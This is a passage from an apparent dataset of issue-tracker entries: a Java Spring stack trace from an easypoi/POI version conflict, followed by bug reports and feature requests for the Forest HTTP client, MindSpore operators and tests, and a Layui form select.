org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:877) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:783) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.d at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974) oFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:158) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.session.ConcurrentSessionFilter.doFilter(ConcurrentSessionFilter.java:155) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.yglink.community.validate.code.ValidateCodeFilter.doFilterInternal(ValidateCodeFilter.java:104) [security-core-1.0-SNAPSHOT.jar:na] at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:158) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.security.web.session.ConcurrentSessionFilter.doFilter(ConcurrentSessionFilter.java:155) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200) at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:109) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at com.yglink.community.validate.code.ValidateCodeFilter.doFilterInternal(ValidateCodeFilter.java:104) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.session.web.http.SessionRepositoryFilter.doFilterInternal(SessionRepositoryFilter.java:147) [spring-session-core-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66) at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:81) [spring-session-core-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:155) [spring-boot-actuator-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:123) [spring-boot-actuator-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) [spring-boot-actuator-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) [catalina.jar:8.5.24] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) [catalina.jar:8.5.24] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:504) [catalina.jar:8.5.24] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) [catalina.jar:8.5.24] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) [catalina.jar:8.5.24] at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650) [catalina.jar:8.5.24] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) [catalina.jar:8.5.24] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) [catalina.jar:8.5.24] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) [tomcat-coyote.jar:8.5.24] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-coyote.jar:8.5.24] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) [tomcat-coyote.jar:8.5.24] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) [tomcat-coyote.jar:8.5.24] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-coyote.jar:8.5.24] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_131] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_131] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-util.jar:8.5.24] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_131] Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.CellStyle.setAlignment(S)V at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.stringNoneStyle(ExcelExportStylerDefaultImpl.java:69) ~[easypoi-base-3.3.0.jar:na] at cn.afterturn.easypoi.excel.export.styler.AbstractExcelExportStyler.createStyles(AbstractExcelExportStyler.java:44) ~[easypoi-base-3.3.0.jar:na] at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.&lt;init&gt;(ExcelExportStylerDefaultImpl.java:31) ~[easypoi-base-3.3.0.jar:na] at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_131] at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_131] at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_131] at java.lang.reflect.Constructor.newInstance(Constructor.java:423) ~[na:1.8.0_131] at cn.afterturn.easypoi.excel.export.ExcelExportService.insertDataToSheet(ExcelExportService.java:225) ~[easypoi-base-3.3.0.jar:na] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) ... 135 common frames omitted at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.session.web.http.SessionRepositoryFilter.doFilterInternal(SessionRepositoryFilter.java:147) at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:81) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:155) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:123) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:504) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.CellStyle.setAlignment(S)V at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.stringNoneStyle(ExcelExportStylerDefaultImpl.java:69) at cn.afterturn.easypoi.excel.export.styler.AbstractExcelExportStyler.createStyles(AbstractExcelExportStyler.java:44) at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.&lt;init&gt;(ExcelExportStylerDefaultImpl.java:31) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at cn.afterturn.easypoi.excel.export.ExcelExportService.insertDataToSheet(ExcelExportService.java:225) at cn.afterturn.easypoi.excel.export.ExcelExportService.createSheetForMap(ExcelExportService.java:210) at cn.afterturn.easypoi.excel.export.ExcelExportService.createSheet(ExcelExportService.java:180) ... 133 more 2018-10-23 12:06:14.937 DEBUG 7945 --- [nio-8080-exec-8] c.y.c.m.a.D.selectPageList : ==&gt; Preparing: SELECT COUNT(1) FROM detail_repair WHERE 1 = 1 AND delFlag = 0 AND orgganId = ? AND areaId IN (SELECT areaId FROM sys_user_area WHERE userId = ? AND orgganId = ?) AND createTime &gt;= ? AND createTime &lt;= date_add(?, INTERVAL 1 day) 2018-10-23 12:06:14.943 DEBUG 7945 --- [nio-8080-exec-8] c.y.c.m.a.D.selectPageList : ==&gt; Parameters: 81beedc9e17b401197edccc1725f06bb(String), bdfedbaaca6f4d5a9782032312be73ee(String), 81beedc9e17b401197edccc1725f06bb(String), 2018-9-23(String), 2018-10-23(String) 2018-"
支持多文件上传,"支持多文件上传， 可结合#I27JFM:支持在@Query，@DataFile等注解中使用隐式变量 ${_it} 、 ${_index} 和 ${_key} 使用：   <code>: @PostRequest(url = ""/upload"") ForestRequest&lt;Map&gt; uploadByteArrayMap(@DataFile(value = ""file"", fileName = ""${_key}"") Map&lt;String, byte[]&gt; byteArrayMap); @PostRequest(url = ""/upload"") ForestRequest&lt;Map&gt; uploadByteArrayList(@DataFile(value = ""file"", fileName = ""test-img-${_index}.jpg"") List&lt;byte[]&gt; byteArrayList); @PostRequest(url = ""/upload"") ForestRequest&lt;Map&gt; uploadByteArrayArray(@DataFile(value = ""file"", fileName = ""test-img-${_index}.jpg"") byte[][] byteArrayArray);"
【众智】【计算-TBE接入】SplitV,在指定dimension上，对输入张量按照指定的sizes进行分割。 size_splits Int/list 属性 split_dim Int 属性 num_split Int 属性 input_x output A list of Tensor 对应底层算子 对应底层AI Core算子SplitVD，已经有算子注册信息。   <code>: class SplitV(Primitive):
form.val()后 select如果没有对应的值总是最后一个为选中项,版本：2.8.0 beta.2 描述：form赋值后，select下拉项里没有对应的选项值，总是默认最后一个选项为选中项（选中效果，非input显示），为啥不默认为第一个空值项，或者不默认 data.value = 0   <code>: ### 代码 &lt;select&gt; &lt;option value=''&gt;&lt;/option&gt; &lt;option value='1'&gt;&lt;/option&gt; &lt;option value='2'&gt;&lt;/option&gt; &lt;option value='3'&gt;&lt;/option&gt; &lt;/select&gt;
Sync stream error is reported when the batchnorm2d test case is executed in batches,": /device ascend + pynative模式 : -- MindSpore version :r1.3 -- Python version :Python 3.7.5 -- OS platform and distribution :Linux localhost.localdomain 4.19.36-vhulk1905.1.0.h276.eulerosv2r8.aarch64 -- GCC/Compiler version : test_batchnorm2d_true_use_batch_statistics_true_track_running_stats_true pytest -s test_batchnorm2d.py batchnorm2d算子用例批跑时有条用例报错Sync stream error,单独执行成功 test pass   <code>: def test_batchnorm2d_true_use_batch_statistics_true_track_running_stats_true(): fact = BatchNorm2dFactory(input_shape=(10, 3, 27, 27), eps=1e-5, momentum=0.1, affine=False, gamma_type=np.float32, beta_type=np.float32, mean_type=np.float32, var_type=np.float32, in_type=np.float32, training=True, use_batch_statistics=True, track_running_stats=True) &gt; fact.forward_cmp() ../operations/test_batchnorm2d.py:1391: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/batchnorm2d_ops.py:280: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/nn/batchnorm2d_ops.py:132: in forward_mindspore_impl return out.asnumpy() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = Tensor(shape=[10, 3, 27, 27], dtype=Float32, value= [[[[-1.59366161e-01, -1.24050498e+00, -2.17664279e-02 ... -1.54951...e-01], [ 1.63928902e+00, 6.73882246e-01, 4.64066751e-02 ... -3.89127702e-01, 1.47758245e+00, 2.84270477e+00]]]]) def asnumpy(self): """"""Convert tensor to numpy array."""""" self.init_check() &gt; return Tensor_.asnumpy(self) E RuntimeError: mindspore/ccsrc/runtime/device/ascend/ascend_device_address.cc:293 SyncStream] Sync stream error! E E # /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/tensor.py:414: RuntimeError"
